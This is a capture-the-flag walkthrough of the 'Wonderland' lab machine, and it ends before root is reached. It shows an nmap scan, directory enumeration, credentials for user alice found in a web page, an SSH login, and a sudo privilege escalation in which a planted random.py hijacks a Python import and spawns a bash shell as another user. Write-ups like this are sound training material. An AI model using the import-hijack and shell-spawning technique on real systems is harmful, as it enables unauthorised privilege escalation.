# Wonderland - Fall down the rabbit hole and enter wonderland - Medium

## Objectives - Find the flag in user.txt and root.txt

### I started by running a basic nmap scan on the target IP address

<p><span style="color:red"><em>nmap -A 10.10.97.29</em></span></p>

### With this scan we found that port 22 (ssh) and 80 (HTTP) are open. My next step was to curl the webpage to see if that would revel any vulnerabilities, it did not. Never fear, the next thing I did was run dirbuster on the webpage. Eventully I run down the web directories to: 

<p><span style="color:red"><em>http://10.10.97.29/r/a/b/b/i/t/</em></p>

### Next I inspected the webpage for more information and found what looks to be credentials for alice.

<p><span style="color:red"><em>alice:HowDothTheLittleCrocodileImproveHisShiningTail</em></span></p>

### Next Im going to try those credentials to access the SSH server. 

<p><span style="color:red"><em>ssh alice@10.10.97.29</em></span></p>

### Im in!! The first thing we see once we log into alices computer is root.txt and a .py file. The Python file is below:


```
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

[... REDACTED ...]

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
By doing:
<p><span style="color:red"><em>sudo -l</em></span></p>
We can see alice may run the folloiwng commands:


```
(rabbit) /usr/bin/python3.6 /hom/alice/walrus_and_thecarpenter.py
```

Next I created a .py file named random so that it would be imported and run the next time walrus_and_the_carpenter.py was run. In this python file I put:

```
import pty;pty.spawn("/bin/bash")
```

Finally the last thing I need to do is run the python file. 

<p><span style="color:red"><em>sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</em></span></p>

